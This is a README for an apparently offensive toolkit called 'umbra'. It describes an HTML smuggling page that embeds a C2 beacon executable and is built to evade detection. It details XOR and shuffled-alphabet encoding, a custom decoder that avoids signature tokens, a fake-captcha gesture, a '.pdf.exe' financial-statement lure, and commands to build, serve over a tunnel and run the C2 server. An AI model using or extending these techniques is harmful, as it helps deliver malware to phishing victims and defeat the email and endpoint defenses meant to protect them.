# Evasive self-contained HTML smuggling (umbra)

This replaces the plain-base64 smuggle page (`var file = 'TVqQAAMAAAAEAAAA...'`)
with a payload that carries the **same umbra beacon** but survives the three
things that were getting it flagged.

## Why the old page was flagged

| Signature on the old page | Who catches it |
| --- | --- |
| `TVqQAAMAAAAEAAAA` (standard base64 of the `MZ` header) | mail gateways, SWG, YARA/Suricata HTML-smuggling rules |
| `atob( )` + `new Blob` + `createObjectURL` + `a.download` in one page | generic "suspicious HTML" heuristics |
| silent auto-download on page load | browser/EDR download heuristics |
| one multi-MB single line | "big high-entropy blob" heuristic |

## What the new page does instead

Generation (`scripts/make_smuggle.py`, Python 3, no deps) — layers applied to
`dist/loader.exe`:

1. **XOR** every byte with a random 32-byte key -> the `MZ` header and the
   `TVqQ` base64 prefix no longer exist; the blob is noise.
2. Encode with a **shuffled 64-char alphabet** (per-file permutation of the
   standard base64 alphabet) -> a normal base64 decoder yields garbage; no
   standard-base64 fingerprint.
3. **Byte-reverse** the whole string.
4. Split into **many short chunks** (one per line) held in a JS array.
5. Assemble + download **only after a real user gesture** (the fake captcha).

The decoder is bespoke (no `atob`, no literal `base64`), and the saved file is
disguised with a double extension (`*.pdf.exe`). As a safeguard, the generator
re-rolls the shuffled alphabet until the rendered page contains none of the
literal tokens `atob` / `btoa` / `base64` / `TVqQ` / `exe.data`; those short
substrings can otherwise appear by chance inside the encoded blob, so every
build (random seed included) is guaranteed clean. Because the payload is
embedded, no network fetch happens at run time — the delivery still works if
the payload URL is blocked.

The payload is **your own C2**: point `--in` at the `dist/loader.exe` built by
`scripts/build.sh` (`cmd/beacon`). No msfvenom / meterpreter.

## Use

`scripts/build.sh` already produces this page: after it builds `loader.exe` it
runs the generator, so `dist/index.html` is ready to serve with **no extra
step**. Run the whole build on the Kali box:

```bash
bash scripts/run.sh build      # -> dist/index.html (evasive smuggle page)
```

That is the normal path. To (re)generate only the page, or to tweak the name /
decoy / encoding afterwards:

```bash
# from the umbra module root (Kali or this host)
python3 scripts/make_smuggle.py \
    --in  dist/loader.exe \
    --out dist/index.html \
    --name 2026-Q3_Financial_Statement.pdf.exe \
    --verify
```

To force the old plain anchor page instead, build with `SMUGGLE=0
bash scripts/build.sh` (or `SMUGGLE=0 bash scripts/run.sh build`).

Then serve `dist/` exactly as before (`scripts/serve.sh` -> `scripts/cf_tunnel.sh`)
and run the umbra C2 (`./dist/server -listen 127.0.0.1:8443 -pass '<C2_PASS>'`).
`dist/index.html` becomes the landing page.

Useful flags:

| flag | meaning |
| --- | --- |
| `--auto` | download without the captcha click (less evasive; matches the old behaviour) |
| `--name` | saved file name (default `2026-Q3_Financial_Statement.pdf.exe`) |
| `--doc` / `--title` | decoy document name / tab title |
| `--chunk N` | characters per embedded chunk (default 4096) |
| `--key-len N` | XOR key length (default 32) |
| `--seed N` | reproducible build (default: random per build) |
| `--verify` | decode the result with `node` and compare the SHA-256 against the input |

`build.sh` passes `--name`/`--doc` from `PAYLOAD_NAME`/`DOC_NAME` and adds
`--verify` automatically **when `node` is on PATH** (it is skipped silently
otherwise, so the build never fails for lack of node).

`--verify` is the regression test: it re-implements the browser decode in Node
and must print `OK - round-trip matches` before you ship the page.

## Interpreting the result

- **Confirmed by tooling:** the generated page round-trips back to the exact
  `loader.exe` bytes (SHA-256 `6f62df86…521f`, 7,017,472 bytes) and contains
  zero literal matches for `TVqQ` / `atob` / `btoa` / `base64` / `exe.data`
  (validated across three independent random-seed builds).
- **Inference:** removing the base64/`TVqQ`/`atob`/auto-download/single-line
  signatures removes the specific static detections listed above. It does
  **not** prove evasion against any particular product — validate in your own
  lab against the stack that flagged you.

## Remaining, honest caveats

- **The binary is unchanged.** This only changes the *delivery format*
  signature. If your EDR flags the Go beacon on execution (memory/runtime
  behaviour), that is a separate problem the umbra indirect-syscall engine and
  build flags address — not the HTML.
- **Size.** A 7 MB beacon becomes a ~9.4 MB HTML. Some gateways strip or block
  large HTML attachments; if yours does, deliver the fileless chain instead
  (`.lnk` -> `stage.ps1` -> `blob.hex`) or a smaller beacon.
- **MOTW.** A browser download may still carry `Zone.Identifier`; see the main
  README troubleshooting section.
- **Publishing a multi-MB page under `set -o pipefail`.** If any script pipes a
  large fetched page into `grep -q`, the reader exits on the first match and the
  writer dies of SIGPIPE (exit 141); `pipefail` then turns that into a spurious
  pipeline failure. The old `scripts/cf_tunnel.sh` pre-flight did exactly this,
  so it always claimed the origin was *not* the umbra site once the page grew past
  the pipe buffer (~64 KB). It now uses a pure-bash substring match
  (`case "$body" in *"$STAGE_MARKER"*)`) with no pipe. `scripts/verify.sh` was
  never affected: it greps a file on disk, not a pipe.
